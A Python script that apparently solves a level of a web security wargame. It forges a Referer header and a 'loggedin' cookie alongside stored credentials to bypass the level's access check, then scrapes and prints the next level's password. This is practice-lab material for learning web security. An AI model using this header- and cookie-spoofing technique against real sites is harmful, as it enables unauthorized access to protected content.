#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials

level_url = credentials[5]["url"]
level_username = credentials[5]["level"]
level_password = credentials[5]["password"]

next_level_url = credentials[6]["url"]
next_level_username = credentials[6]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}
cooks = {"loggedin": "1"}

response = requests.get(level_url, headers=heads, cookies=cooks)

data = response.text
strings = re.split('\n|:|\s|<|>', data)
next_password = strings[strings.index(next_level_username) + 2]

print(next_password)
